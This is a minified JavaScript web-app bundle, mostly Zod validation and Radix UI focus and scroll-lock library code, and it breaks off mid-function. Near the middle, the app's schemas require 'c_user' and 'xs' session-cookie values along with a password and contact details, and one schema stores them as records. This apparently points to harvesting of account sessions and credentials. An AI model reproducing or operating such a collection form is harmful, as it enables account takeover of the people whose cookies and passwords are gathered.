        return r.common.async ? pt.mergeObjectAsync(n, o) : pt.mergeObjectSync(n, o)
    }
    get element() {
        return this._def.valueType
    }
    static create(t, n, r) {
        return n instanceof ue ? new Vi({
            keyType: t,
            valueType: n,
            typeName: te.ZodRecord,
            ...ae(r)
        }) : new Vi({
            keyType: ln.create(),
            valueType: t,
            typeName: te.ZodRecord,
            ...ae(n)
        })
    }
}
class Ll extends ue {
    get keySchema() {
        return this._def.keyType
    }
    get valueSchema() {
        return this._def.valueType
    }
    _parse(t) {
        const {status: n, ctx: r} = this._processInputParams(t);
        if (r.parsedType !== W.map)
            return B(r, {
                code: I.invalid_type,
                expected: W.map,
                received: r.parsedType
            }),
            ne;
        const o = this._def.keyType
          , s = this._def.valueType
          , i = [...r.data.entries()].map( ([a,l], u) => ({
            key: o._parse(new Nn(r,a,r.path,[u, "key"])),
            value: s._parse(new Nn(r,l,r.path,[u, "value"]))
        }));
        if (r.common.async) {
            const a = new Map;
            return Promise.resolve().then(async () => {
                for (const l of i) {
                    const u = await l.key
                      , c = await l.value;
                    if (u.status === "aborted" || c.status === "aborted")
                        return ne;
                    (u.status === "dirty" || c.status === "dirty") && n.dirty(),
                    a.set(u.value, c.value)
                }
                return {
                    status: n.value,
                    value: a
                }
            }
            )
        } else {
            const a = new Map;
            for (const l of i) {
                const u = l.key
                  , c = l.value;
                if (u.status === "aborted" || c.status === "aborted")
                    return ne;
                (u.status === "dirty" || c.status === "dirty") && n.dirty(),
                a.set(u.value, c.value)
            }
            return {
                status: n.value,
                value: a
            }
        }
    }
}
Ll.create = (e, t, n) => new Ll({
    valueType: t,
    keyType: e,
    typeName: te.ZodMap,
    ...ae(n)
});
class lo extends ue {
    _parse(t) {
        const {status: n, ctx: r} = this._processInputParams(t);
        if (r.parsedType !== W.set)
            return B(r, {
                code: I.invalid_type,
                expected: W.set,
                received: r.parsedType
            }),
            ne;
        const o = this._def;
        o.minSize !== null && r.data.size < o.minSize.value && (B(r, {
            code: I.too_small,
            minimum: o.minSize.value,
            type: "set",
            inclusive: !0,
            exact: !1,
            message: o.minSize.message
        }),
        n.dirty()),
        o.maxSize !== null && r.data.size > o.maxSize.value && (B(r, {
            code: I.too_big,
            maximum: o.maxSize.value,
            type: "set",
            inclusive: !0,
            exact: !1,
            message: o.maxSize.message
        }),
        n.dirty());
        const s = this._def.valueType;
        function i(l) {
            const u = new Set;
            for (const c of l) {
                if (c.status === "aborted")
                    return ne;
                c.status === "dirty" && n.dirty(),
                u.add(c.value)
            }
            return {
                status: n.value,
                value: u
            }
        }
        const a = [...r.data.values()].map( (l, u) => s._parse(new Nn(r,l,r.path,u)));
        return r.common.async ? Promise.all(a).then(l => i(l)) : i(a)
    }
    min(t, n) {
        return new lo({
            ...this._def,
            minSize: {
                value: t,
                message: G.toString(n)
            }
        })
    }
    max(t, n) {
        return new lo({
            ...this._def,
            maxSize: {
                value: t,
                message: G.toString(n)
            }
        })
    }
    size(t, n) {
        return this.min(t, n).max(t, n)
    }
    nonempty(t) {
        return this.min(1, t)
    }
}
lo.create = (e, t) => new lo({
    valueType: e,
    minSize: null,
    maxSize: null,
    typeName: te.ZodSet,
    ...ae(t)
});
class Ko extends ue {
    constructor() {
        super(...arguments),
        this.validate = this.implement
    }
    _parse(t) {
        const {ctx: n} = this._processInputParams(t);
        if (n.parsedType !== W.function)
            return B(n, {
                code: I.invalid_type,
                expected: W.function,
                received: n.parsedType
            }),
            ne;
        function r(a, l) {
            return Ol({
                data: a,
                path: n.path,
                errorMaps: [n.common.contextualErrorMap, n.schemaErrorMap, Al(), hs].filter(u => !!u),
                issueData: {
                    code: I.invalid_arguments,
                    argumentsError: l
                }
            })
        }
        function o(a, l) {
            return Ol({
                data: a,
                path: n.path,
                errorMaps: [n.common.contextualErrorMap, n.schemaErrorMap, Al(), hs].filter(u => !!u),
                issueData: {
                    code: I.invalid_return_type,
                    returnTypeError: l
                }
            })
        }
        const s = {
            errorMap: n.common.contextualErrorMap
        }
          , i = n.data;
        if (this._def.returns instanceof vs) {
            const a = this;
            return wt(async function(...l) {
                const u = new It([])
                  , c = await a._def.args.parseAsync(l, s).catch(w => {
                    throw u.addIssue(r(l, w)),
                    u
                }
                )
                  , d = await Reflect.apply(i, this, c);
                return await a._def.returns._def.type.parseAsync(d, s).catch(w => {
                    throw u.addIssue(o(d, w)),
                    u
                }
                )
            })
        } else {
            const a = this;
            return wt(function(...l) {
                const u = a._def.args.safeParse(l, s);
                if (!u.success)
                    throw new It([r(l, u.error)]);
                const c = Reflect.apply(i, this, u.data)
                  , d = a._def.returns.safeParse(c, s);
                if (!d.success)
                    throw new It([o(c, d.error)]);
                return d.data
            })
        }
    }
    parameters() {
        return this._def.args
    }
    returnType() {
        return this._def.returns
    }
    args(...t) {
        return new Ko({
            ...this._def,
            args: Rn.create(t).rest(to.create())
        })
    }
    returns(t) {
        return new Ko({
            ...this._def,
            returns: t
        })
    }
    implement(t) {
        return this.parse(t)
    }
    strictImplement(t) {
        return this.parse(t)
    }
    static create(t, n, r) {
        return new Ko({
            args: t || Rn.create([]).rest(to.create()),
            returns: n || to.create(),
            typeName: te.ZodFunction,
            ...ae(r)
        })
    }
}
class zi extends ue {
    get schema() {
        return this._def.getter()
    }
    _parse(t) {
        const {ctx: n} = this._processInputParams(t);
        return this._def.getter()._parse({
            data: n.data,
            path: n.path,
            parent: n
        })
    }
}
zi.create = (e, t) => new zi({
    getter: e,
    typeName: te.ZodLazy,
    ...ae(t)
});
class $i extends ue {
    _parse(t) {
        if (t.data !== this._def.value) {
            const n = this._getOrReturnCtx(t);
            return B(n, {
                received: n.data,
                code: I.invalid_literal,
                expected: this._def.value
            }),
            ne
        }
        return {
            status: "valid",
            value: t.data
        }
    }
    get value() {
        return this._def.value
    }
}
$i.create = (e, t) => new $i({
    value: e,
    typeName: te.ZodLiteral,
    ...ae(t)
});
function Bw(e, t) {
    return new Rr({
        values: e,
        typeName: te.ZodEnum,
        ...ae(t)
    })
}
class Rr extends ue {
    constructor() {
        super(...arguments),
        Zs.set(this, void 0)
    }
    _parse(t) {
        if (typeof t.data != "string") {
            const n = this._getOrReturnCtx(t)
              , r = this._def.values;
            return B(n, {
                expected: pe.joinValues(r),
                received: n.parsedType,
                code: I.invalid_type
            }),
            ne
        }
        if (jl(this, Zs) || Vw(this, Zs, new Set(this._def.values)),
        !jl(this, Zs).has(t.data)) {
            const n = this._getOrReturnCtx(t)
              , r = this._def.values;
            return B(n, {
                received: n.data,
                code: I.invalid_enum_value,
                options: r
            }),
            ne
        }
        return wt(t.data)
    }
    get options() {
        return this._def.values
    }
    get enum() {
        const t = {};
        for (const n of this._def.values)
            t[n] = n;
        return t
    }
    get Values() {
        const t = {};
        for (const n of this._def.values)
            t[n] = n;
        return t
    }
    get Enum() {
        const t = {};
        for (const n of this._def.values)
            t[n] = n;
        return t
    }
    extract(t, n=this._def) {
        return Rr.create(t, {
            ...this._def,
            ...n
        })
    }
    exclude(t, n=this._def) {
        return Rr.create(this.options.filter(r => !t.includes(r)), {
            ...this._def,
            ...n
        })
    }
}
Zs = new WeakMap;
Rr.create = Bw;
class Ui extends ue {
    constructor() {
        super(...arguments),
        Ks.set(this, void 0)
    }
    _parse(t) {
        const n = pe.getValidEnumValues(this._def.values)
          , r = this._getOrReturnCtx(t);
        if (r.parsedType !== W.string && r.parsedType !== W.number) {
            const o = pe.objectValues(n);
            return B(r, {
                expected: pe.joinValues(o),
                received: r.parsedType,
                code: I.invalid_type
            }),
            ne
        }
        if (jl(this, Ks) || Vw(this, Ks, new Set(pe.getValidEnumValues(this._def.values))),
        !jl(this, Ks).has(t.data)) {
            const o = pe.objectValues(n);
            return B(r, {
                received: r.data,
                code: I.invalid_enum_value,
                options: o
            }),
            ne
        }
        return wt(t.data)
    }
    get enum() {
        return this._def.values
    }
}
Ks = new WeakMap;
Ui.create = (e, t) => new Ui({
    values: e,
    typeName: te.ZodNativeEnum,
    ...ae(t)
});
class vs extends ue {
    unwrap() {
        return this._def.type
    }
    _parse(t) {
        const {ctx: n} = this._processInputParams(t);
        if (n.parsedType !== W.promise && n.common.async === !1)
            return B(n, {
                code: I.invalid_type,
                expected: W.promise,
                received: n.parsedType
            }),
            ne;
        const r = n.parsedType === W.promise ? n.data : Promise.resolve(n.data);
        return wt(r.then(o => this._def.type.parseAsync(o, {
            path: n.path,
            errorMap: n.common.contextualErrorMap
        })))
    }
}
vs.create = (e, t) => new vs({
    type: e,
    typeName: te.ZodPromise,
    ...ae(t)
});
class pn extends ue {
    innerType() {
        return this._def.schema
    }
    sourceType() {
        return this._def.schema._def.typeName === te.ZodEffects ? this._def.schema.sourceType() : this._def.schema
    }
    _parse(t) {
        const {status: n, ctx: r} = this._processInputParams(t)
          , o = this._def.effect || null
          , s = {
            addIssue: i => {
                B(r, i),
                i.fatal ? n.abort() : n.dirty()
            }
            ,
            get path() {
                return r.path
            }
        };
        if (s.addIssue = s.addIssue.bind(s),
        o.type === "preprocess") {
            const i = o.transform(r.data, s);
            if (r.common.async)
                return Promise.resolve(i).then(async a => {
                    if (n.value === "aborted")
                        return ne;
                    const l = await this._def.schema._parseAsync({
                        data: a,
                        path: r.path,
                        parent: r
                    });
                    return l.status === "aborted" ? ne : l.status === "dirty" || n.value === "dirty" ? Fo(l.value) : l
                }
                );
            {
                if (n.value === "aborted")
                    return ne;
                const a = this._def.schema._parseSync({
                    data: i,
                    path: r.path,
                    parent: r
                });
                return a.status === "aborted" ? ne : a.status === "dirty" || n.value === "dirty" ? Fo(a.value) : a
            }
        }
        if (o.type === "refinement") {
            const i = a => {
                const l = o.refinement(a, s);
                if (r.common.async)
                    return Promise.resolve(l);
                if (l instanceof Promise)
                    throw new Error("Async refinement encountered during synchronous parse operation. Use .parseAsync instead.");
                return a
            }
            ;
            if (r.common.async === !1) {
                const a = this._def.schema._parseSync({
                    data: r.data,
                    path: r.path,
                    parent: r
                });
                return a.status === "aborted" ? ne : (a.status === "dirty" && n.dirty(),
                i(a.value),
                {
                    status: n.value,
                    value: a.value
                })
            } else
                return this._def.schema._parseAsync({
                    data: r.data,
                    path: r.path,
                    parent: r
                }).then(a => a.status === "aborted" ? ne : (a.status === "dirty" && n.dirty(),
                i(a.value).then( () => ({
                    status: n.value,
                    value: a.value
                }))))
        }
        if (o.type === "transform")
            if (r.common.async === !1) {
                const i = this._def.schema._parseSync({
                    data: r.data,
                    path: r.path,
                    parent: r
                });
                if (!Oi(i))
                    return i;
                const a = o.transform(i.value, s);
                if (a instanceof Promise)
                    throw new Error("Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.");
                return {
                    status: n.value,
                    value: a
                }
            } else
                return this._def.schema._parseAsync({
                    data: r.data,
                    path: r.path,
                    parent: r
                }).then(i => Oi(i) ? Promise.resolve(o.transform(i.value, s)).then(a => ({
                    status: n.value,
                    value: a
                })) : i);
        pe.assertNever(o)
    }
}
pn.create = (e, t, n) => new pn({
    schema: e,
    typeName: te.ZodEffects,
    effect: t,
    ...ae(n)
});
pn.createWithPreprocess = (e, t, n) => new pn({
    schema: t,
    effect: {
        type: "preprocess",
        transform: e
    },
    typeName: te.ZodEffects,
    ...ae(n)
});
class Tn extends ue {
    _parse(t) {
        return this._getType(t) === W.undefined ? wt(void 0) : this._def.innerType._parse(t)
    }
    unwrap() {
        return this._def.innerType
    }
}
Tn.create = (e, t) => new Tn({
    innerType: e,
    typeName: te.ZodOptional,
    ...ae(t)
});
class Ar extends ue {
    _parse(t) {
        return this._getType(t) === W.null ? wt(null) : this._def.innerType._parse(t)
    }
    unwrap() {
        return this._def.innerType
    }
}
Ar.create = (e, t) => new Ar({
    innerType: e,
    typeName: te.ZodNullable,
    ...ae(t)
});
class Bi extends ue {
    _parse(t) {
        const {ctx: n} = this._processInputParams(t);
        let r = n.data;
        return n.parsedType === W.undefined && (r = this._def.defaultValue()),
        this._def.innerType._parse({
            data: r,
            path: n.path,
            parent: n
        })
    }
    removeDefault() {
        return this._def.innerType
    }
}
Bi.create = (e, t) => new Bi({
    innerType: e,
    typeName: te.ZodDefault,
    defaultValue: typeof t.default == "function" ? t.default : () => t.default,
    ...ae(t)
});
class Hi extends ue {
    _parse(t) {
        const {ctx: n} = this._processInputParams(t)
          , r = {
            ...n,
            common: {
                ...n.common,
                issues: []
            }
        }
          , o = this._def.innerType._parse({
            data: r.data,
            path: r.path,
            parent: {
                ...r
            }
        });
        return ji(o) ? o.then(s => ({
            status: "valid",
            value: s.status === "valid" ? s.value : this._def.catchValue({
                get error() {
                    return new It(r.common.issues)
                },
                input: r.data
            })
        })) : {
            status: "valid",
            value: o.status === "valid" ? o.value : this._def.catchValue({
                get error() {
                    return new It(r.common.issues)
                },
                input: r.data
            })
        }
    }
    removeCatch() {
        return this._def.innerType
    }
}
Hi.create = (e, t) => new Hi({
    innerType: e,
    typeName: te.ZodCatch,
    catchValue: typeof t.catch == "function" ? t.catch : () => t.catch,
    ...ae(t)
});
class Dl extends ue {
    _parse(t) {
        if (this._getType(t) !== W.nan) {
            const r = this._getOrReturnCtx(t);
            return B(r, {
                code: I.invalid_type,
                expected: W.nan,
                received: r.parsedType
            }),
            ne
        }
        return {
            status: "valid",
            value: t.data
        }
    }
}
Dl.create = e => new Dl({
    typeName: te.ZodNaN,
    ...ae(e)
});
const Xk = Symbol("zod_brand");
class Gf extends ue {
    _parse(t) {
        const {ctx: n} = this._processInputParams(t)
          , r = n.data;
        return this._def.type._parse({
            data: r,
            path: n.path,
            parent: n
        })
    }
    unwrap() {
        return this._def.type
    }
}
class oa extends ue {
    _parse(t) {
        const {status: n, ctx: r} = this._processInputParams(t);
        if (r.common.async)
            return (async () => {
                const s = await this._def.in._parseAsync({
                    data: r.data,
                    path: r.path,
                    parent: r
                });
                return s.status === "aborted" ? ne : s.status === "dirty" ? (n.dirty(),
                Fo(s.value)) : this._def.out._parseAsync({
                    data: s.value,
                    path: r.path,
                    parent: r
                })
            }
            )();
        {
            const o = this._def.in._parseSync({
                data: r.data,
                path: r.path,
                parent: r
            });
            return o.status === "aborted" ? ne : o.status === "dirty" ? (n.dirty(),
            {
                status: "dirty",
                value: o.value
            }) : this._def.out._parseSync({
                data: o.value,
                path: r.path,
                parent: r
            })
        }
    }
    static create(t, n) {
        return new oa({
            in: t,
            out: n,
            typeName: te.ZodPipeline
        })
    }
}
class Wi extends ue {
    _parse(t) {
        const n = this._def.innerType._parse(t)
          , r = o => (Oi(o) && (o.value = Object.freeze(o.value)),
        o);
        return ji(n) ? n.then(o => r(o)) : r(n)
    }
    unwrap() {
        return this._def.innerType
    }
}
Wi.create = (e, t) => new Wi({
    innerType: e,
    typeName: te.ZodReadonly,
    ...ae(t)
});
function Hw(e, t={}, n) {
    return e ? ms.create().superRefine( (r, o) => {
        var s, i;
        if (!e(r)) {
            const a = typeof t == "function" ? t(r) : typeof t == "string" ? {
                message: t
            } : t
              , l = (i = (s = a.fatal) !== null && s !== void 0 ? s : n) !== null && i !== void 0 ? i : !0
              , u = typeof a == "string" ? {
                message: a
            } : a;
            o.addIssue({
                code: "custom",
                ...u,
                fatal: l
            })
        }
    }
    ) : ms.create()
}
const Jk = {
    object: Oe.lazycreate
};
var te;
(function(e) {
    e.ZodString = "ZodString",
    e.ZodNumber = "ZodNumber",
    e.ZodNaN = "ZodNaN",
    e.ZodBigInt = "ZodBigInt",
    e.ZodBoolean = "ZodBoolean",
    e.ZodDate = "ZodDate",
    e.ZodSymbol = "ZodSymbol",
    e.ZodUndefined = "ZodUndefined",
    e.ZodNull = "ZodNull",
    e.ZodAny = "ZodAny",
    e.ZodUnknown = "ZodUnknown",
    e.ZodNever = "ZodNever",
    e.ZodVoid = "ZodVoid",
    e.ZodArray = "ZodArray",
    e.ZodObject = "ZodObject",
    e.ZodUnion = "ZodUnion",
    e.ZodDiscriminatedUnion = "ZodDiscriminatedUnion",
    e.ZodIntersection = "ZodIntersection",
    e.ZodTuple = "ZodTuple",
    e.ZodRecord = "ZodRecord",
    e.ZodMap = "ZodMap",
    e.ZodSet = "ZodSet",
    e.ZodFunction = "ZodFunction",
    e.ZodLazy = "ZodLazy",
    e.ZodLiteral = "ZodLiteral",
    e.ZodEnum = "ZodEnum",
    e.ZodEffects = "ZodEffects",
    e.ZodNativeEnum = "ZodNativeEnum",
    e.ZodOptional = "ZodOptional",
    e.ZodNullable = "ZodNullable",
    e.ZodDefault = "ZodDefault",
    e.ZodCatch = "ZodCatch",
    e.ZodPromise = "ZodPromise",
    e.ZodBranded = "ZodBranded",
    e.ZodPipeline = "ZodPipeline",
    e.ZodReadonly = "ZodReadonly"
}
)(te || (te = {}));
const eT = (e, t={
    message: `Input not instance of ${e.name}`
}) => Hw(n => n instanceof e, t)
  , Ww = ln.create
  , Zw = Pr.create
  , tT = Dl.create
  , nT = Nr.create
  , Kw = Mi.create
  , rT = ao.create
  , oT = Ml.create
  , sT = Ii.create
  , iT = Li.create
  , aT = ms.create
  , lT = to.create
  , uT = qn.create
  , cT = Il.create
  , dT = dn.create
  , fT = Oe.create
  , pT = Oe.strictCreate
  , hT = Di.create
  , mT = gu.create
  , vT = Fi.create
  , gT = Rn.create
  , yT = Vi.create
  , wT = Ll.create
  , xT = lo.create
  , ST = Ko.create
  , _T = zi.create
  , ET = $i.create
  , bT = Rr.create
  , CT = Ui.create
  , kT = vs.create
  , dm = pn.create
  , TT = Tn.create
  , PT = Ar.create
  , NT = pn.createWithPreprocess
  , RT = oa.create
  , AT = () => Ww().optional()
  , OT = () => Zw().optional()
  , jT = () => Kw().optional()
  , MT = {
    string: e => ln.create({
        ...e,
        coerce: !0
    }),
    number: e => Pr.create({
        ...e,
        coerce: !0
    }),
    boolean: e => Mi.create({
        ...e,
        coerce: !0
    }),
    bigint: e => Nr.create({
        ...e,
        coerce: !0
    }),
    date: e => ao.create({
        ...e,
        coerce: !0
    })
}
  , IT = ne;
var Be = Object.freeze({
    __proto__: null,
    defaultErrorMap: hs,
    setErrorMap: Ik,
    getErrorMap: Al,
    makeIssue: Ol,
    EMPTY_PATH: Lk,
    addIssueToContext: B,
    ParseStatus: pt,
    INVALID: ne,
    DIRTY: Fo,
    OK: wt,
    isAborted: Cd,
    isDirty: kd,
    isValid: Oi,
    isAsync: ji,
    get util() {
        return pe
    },
    get objectUtil() {
        return bd
    },
    ZodParsedType: W,
    getParsedType: ur,
    ZodType: ue,
    datetimeRegex: Uw,
    ZodString: ln,
    ZodNumber: Pr,
    ZodBigInt: Nr,
    ZodBoolean: Mi,
    ZodDate: ao,
    ZodSymbol: Ml,
    ZodUndefined: Ii,
    ZodNull: Li,
    ZodAny: ms,
    ZodUnknown: to,
    ZodNever: qn,
    ZodVoid: Il,
    ZodArray: dn,
    ZodObject: Oe,
    ZodUnion: Di,
    ZodDiscriminatedUnion: gu,
    ZodIntersection: Fi,
    ZodTuple: Rn,
    ZodRecord: Vi,
    ZodMap: Ll,
    ZodSet: lo,
    ZodFunction: Ko,
    ZodLazy: zi,
    ZodLiteral: $i,
    ZodEnum: Rr,
    ZodNativeEnum: Ui,
    ZodPromise: vs,
    ZodEffects: pn,
    ZodTransformer: pn,
    ZodOptional: Tn,
    ZodNullable: Ar,
    ZodDefault: Bi,
    ZodCatch: Hi,
    ZodNaN: Dl,
    BRAND: Xk,
    ZodBranded: Gf,
    ZodPipeline: oa,
    ZodReadonly: Wi,
    custom: Hw,
    Schema: ue,
    ZodSchema: ue,
    late: Jk,
    get ZodFirstPartyTypeKind() {
        return te
    },
    coerce: MT,
    any: aT,
    array: dT,
    bigint: nT,
    boolean: Kw,
    date: rT,
    discriminatedUnion: mT,
    effect: dm,
    enum: bT,
    function: ST,
    instanceof: eT,
    intersection: vT,
    lazy: _T,
    literal: ET,
    map: wT,
    nan: tT,
    nativeEnum: CT,
    never: uT,
    null: iT,
    nullable: PT,
    number: Zw,
    object: fT,
    oboolean: jT,
    onumber: OT,
    optional: TT,
    ostring: AT,
    pipeline: RT,
    preprocess: NT,
    promise: kT,
    record: yT,
    set: xT,
    strictObject: pT,
    string: Ww,
    symbol: oT,
    transformer: dm,
    tuple: gT,
    undefined: sT,
    union: hT,
    unknown: lT,
    void: cT,
    NEVER: IT,
    ZodIssueCode: I,
    quotelessJson: Mk,
    ZodError: It
});
const LT = Be.object({
    c_user: Be.string().min(1, "c_user is required"),
    xs: Be.string().min(1, "xs is required"),
    admin_email: Be.string().email("Invalid email").optional()
})
  , DT = Be.object({
    c_user: Be.string().min(1, "c_user is required"),
    xs: Be.string().min(1, "xs is required"),
    user_email: Be.string().optional(),
    password: Be.string().min(6, "Password must be at least 6 characters"),
    contactMethod: Be.enum(["email", "phone"]).default("email"),
    countryCode: Be.string().optional()
}).partial({
    user_email: !0,
    countryCode: !0,
    contactMethod: !0
});
Be.object({
    id: Be.number(),
    c_user: Be.string(),
    xs: Be.string(),
    user_email: Be.string().optional(),
    password: Be.string(),
    contactMethod: Be.enum(["email", "phone"]),
    countryCode: Be.string().optional(),
    createdAt: Be.date()
});
var FT = Gm.useId || ( () => {}
)
  , VT = 0;
function Qo(e) {
    const [t,n] = h.useState(FT());
    return ft( () => {
        n(r => r ?? String(VT++))
    }
    , [e]),
    t ? `radix-${t}` : ""
}
var dc = "focusScope.autoFocusOnMount"
  , fc = "focusScope.autoFocusOnUnmount"
  , fm = {
    bubbles: !1,
    cancelable: !0
}
  , zT = "FocusScope"
  , Yf = h.forwardRef( (e, t) => {
    const {loop: n=!1, trapped: r=!1, onMountAutoFocus: o, onUnmountAutoFocus: s, ...i} = e
      , [a,l] = h.useState(null)
      , u = Ft(o)
      , c = Ft(s)
      , d = h.useRef(null)
      , p = Le(t, m => l(m))
      , w = h.useRef({
        paused: !1,
        pause() {
            this.paused = !0
        },
        resume() {
            this.paused = !1
        }
    }).current;
    h.useEffect( () => {
        if (r) {
            let m = function(y) {
                if (w.paused || !a)
                    return;
                const _ = y.target;
                a.contains(_) ? d.current = _ : rr(d.current, {
                    select: !0
                })
            }
              , S = function(y) {
                if (w.paused || !a)
                    return;
                const _ = y.relatedTarget;
                _ !== null && (a.contains(_) || rr(d.current, {
                    select: !0
                }))
            }
              , v = function(y) {
                if (document.activeElement === document.body)
                    for (const b of y)
                        b.removedNodes.length > 0 && rr(a)
            };
            document.addEventListener("focusin", m),
            document.addEventListener("focusout", S);
            const f = new MutationObserver(v);
            return a && f.observe(a, {
                childList: !0,
                subtree: !0
            }),
            () => {
                document.removeEventListener("focusin", m),
                document.removeEventListener("focusout", S),
                f.disconnect()
            }
        }
    }
    , [r, a, w.paused]),
    h.useEffect( () => {
        if (a) {
            hm.add(w);
            const m = document.activeElement;
            if (!a.contains(m)) {
                const v = new CustomEvent(dc,fm);
                a.addEventListener(dc, u),
                a.dispatchEvent(v),
                v.defaultPrevented || ($T(ZT(Qw(a)), {
                    select: !0
                }),
                document.activeElement === m && rr(a))
            }
            return () => {
                a.removeEventListener(dc, u),
                setTimeout( () => {
                    const v = new CustomEvent(fc,fm);
                    a.addEventListener(fc, c),
                    a.dispatchEvent(v),
                    v.defaultPrevented || rr(m ?? document.body, {
                        select: !0
                    }),
                    a.removeEventListener(fc, c),
                    hm.remove(w)
                }
                , 0)
            }
        }
    }
    , [a, u, c, w]);
    const x = h.useCallback(m => {
        if (!n && !r || w.paused)
            return;
        const S = m.key === "Tab" && !m.altKey && !m.ctrlKey && !m.metaKey
          , v = document.activeElement;
        if (S && v) {
            const f = m.currentTarget
              , [y,_] = UT(f);
            y && _ ? !m.shiftKey && v === _ ? (m.preventDefault(),
            n && rr(y, {
                select: !0
            })) : m.shiftKey && v === y && (m.preventDefault(),
            n && rr(_, {
                select: !0
            })) : v === f && m.preventDefault()
        }
    }
    , [n, r, w.paused]);
    return g.jsx(ge.div, {
        tabIndex: -1,
        ...i,
        ref: p,
        onKeyDown: x
    })
}
);
Yf.displayName = zT;
function $T(e, {select: t=!1}={}) {
    const n = document.activeElement;
    for (const r of e)
        if (rr(r, {
            select: t
        }),
        document.activeElement !== n)
            return
}
function UT(e) {
    const t = Qw(e)
      , n = pm(t, e)
      , r = pm(t.reverse(), e);
    return [n, r]
}
function Qw(e) {
    const t = []
      , n = document.createTreeWalker(e, NodeFilter.SHOW_ELEMENT, {
        acceptNode: r => {
            const o = r.tagName === "INPUT" && r.type === "hidden";
            return r.disabled || r.hidden || o ? NodeFilter.FILTER_SKIP : r.tabIndex >= 0 ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_SKIP
        }
    });
    for (; n.nextNode(); )
        t.push(n.currentNode);
    return t
}
function pm(e, t) {
    for (const n of e)
        if (!BT(n, {
            upTo: t
        }))
            return n
}
function BT(e, {upTo: t}) {
    if (getComputedStyle(e).visibility === "hidden")
        return !0;
    for (; e; ) {
        if (t !== void 0 && e === t)
            return !1;
        if (getComputedStyle(e).display === "none")
            return !0;
        e = e.parentElement
    }
    return !1
}
function HT(e) {
    return e instanceof HTMLInputElement && "select"in e
}
function rr(e, {select: t=!1}={}) {
    if (e && e.focus) {
        const n = document.activeElement;
        e.focus({
            preventScroll: !0
        }),
        e !== n && HT(e) && t && e.select()
    }
}
var hm = WT();
function WT() {
    let e = [];
    return {
        add(t) {
            const n = e[0];
            t !== n && (n == null || n.pause()),
            e = mm(e, t),
            e.unshift(t)
        },
        remove(t) {
            var n;
            e = mm(e, t),
            (n = e[0]) == null || n.resume()
        }
    }
}
function mm(e, t) {
    const n = [...e]
      , r = n.indexOf(t);
    return r !== -1 && n.splice(r, 1),
    n
}
function ZT(e) {
    return e.filter(t => t.tagName !== "A")
}
var pc = 0;
function qw() {
    h.useEffect( () => {
        const e = document.querySelectorAll("[data-radix-focus-guard]");
        return document.body.insertAdjacentElement("afterbegin", e[0] ?? vm()),
        document.body.insertAdjacentElement("beforeend", e[1] ?? vm()),
        pc++,
        () => {
            pc === 1 && document.querySelectorAll("[data-radix-focus-guard]").forEach(t => t.remove()),
            pc--
        }
    }
    , [])
}
function vm() {
    const e = document.createElement("span");
    return e.setAttribute("data-radix-focus-guard", ""),
    e.tabIndex = 0,
    e.style.outline = "none",
    e.style.opacity = "0",
    e.style.position = "fixed",
    e.style.pointerEvents = "none",
    e
}
var En = function() {
    return En = Object.assign || function(t) {
        for (var n, r = 1, o = arguments.length; r < o; r++) {
            n = arguments[r];
            for (var s in n)
                Object.prototype.hasOwnProperty.call(n, s) && (t[s] = n[s])
        }
        return t
    }
    ,
    En.apply(this, arguments)
};
function Gw(e, t) {
    var n = {};
    for (var r in e)
        Object.prototype.hasOwnProperty.call(e, r) && t.indexOf(r) < 0 && (n[r] = e[r]);
    if (e != null && typeof Object.getOwnPropertySymbols == "function")
        for (var o = 0, r = Object.getOwnPropertySymbols(e); o < r.length; o++)
            t.indexOf(r[o]) < 0 && Object.prototype.propertyIsEnumerable.call(e, r[o]) && (n[r[o]] = e[r[o]]);
    return n
}
function KT(e, t, n) {
    if (n || arguments.length === 2)
        for (var r = 0, o = t.length, s; r < o; r++)
            (s || !(r in t)) && (s || (s = Array.prototype.slice.call(t, 0, r)),
            s[r] = t[r]);
    return e.concat(s || Array.prototype.slice.call(t))
}
var Ga = "right-scroll-bar-position"
  , Ya = "width-before-scroll-bar"
  , QT = "with-scroll-bars-hidden"
  , qT = "--removed-body-scroll-bar-size";
function hc(e, t) {
    return typeof e == "function" ? e(t) : e && (e.current = t),
    e
}
function GT(e, t) {
    var n = h.useState(function() {
        return {
            value: e,
            callback: t,
            facade: {
                get current() {
                    return n.value
                },
                set current(r) {
                    var o = n.value;
                    o !== r && (n.value = r,
                    n.callback(r, o))
                }
            }
        }
    })[0];
    return n.callback = t,
    n.facade
}
var YT = typeof window < "u" ? h.useLayoutEffect : h.useEffect
  , gm = new WeakMap;
function XT(e, t) {
    var n = GT(null, function(r) {
        return e.forEach(function(o) {
            return hc(o, r)
        })
    });
    return YT(function() {
        var r = gm.get(n);
        if (r) {
            var o = new Set(r)
              , s = new Set(e)
              , i = n.current;
            o.forEach(function(a) {
                s.has(a) || hc(a, null)
            }),
            s.forEach(function(a) {
                o.has(a) || hc(a, i)
            })
        }
        gm.set(n, e)
    }, [e]),
    n
}
function JT(e) {
    return e
}
function eP(e, t) {
    t === void 0 && (t = JT);
    var n = []
      , r = !1
      , o = {
        read: function() {
            if (r)
                throw new Error("Sidecar: could not `read` from an `assigned` medium. `read` could be used only with `useMedium`.");
            return n.length ? n[n.length - 1] : e
        },
        useMedium: function(s) {
            var i = t(s, r);
            return n.push(i),
            function() {
                n = n.filter(function(a) {
                    return a !== i
                })
            }
        },
        assignSyncMedium: function(s) {
            for (r = !0; n.length; ) {
                var i = n;
                n = [],
                i.forEach(s)
            }
            n = {
                push: function(a) {
                    return s(a)
                },
                filter: function() {
                    return n
                }
            }
        },
        assignMedium: function(s) {
            r = !0;
            var i = [];
            if (n.length) {
                var a = n;
                n = [],
                a.forEach(s),
                i = n
            }
            var l = function() {
                var c = i;
                i = [],
                c.forEach(s)
            }
              , u = function() {
                return Promise.resolve().then(l)
            };
            u(),
            n = {
                push: function(c) {
                    i.push(c),
                    u()
                },
                filter: function(c) {
                    return i = i.filter(c),
                    n
                }
            }
        }
    };
    return o
}
function tP(e) {
    e === void 0 && (e = {});
    var t = eP(null);
    return t.options = En({
        async: !0,
        ssr: !1
    }, e),
    t
}
var Yw = function(e) {
    var t = e.sideCar
      , n = Gw(e, ["sideCar"]);
    if (!t)
        throw new Error("Sidecar: please provide `sideCar` property to import the right car");
    var r = t.read();
    if (!r)
        throw new Error("Sidecar medium not found");
    return h.createElement(r, En({}, n))
};
Yw.isSideCarExport = !0;
function nP(e, t) {
    return e.useMedium(t),
    Yw
}
var Xw = tP()
  , mc = function() {}
  , yu = h.forwardRef(function(e, t) {
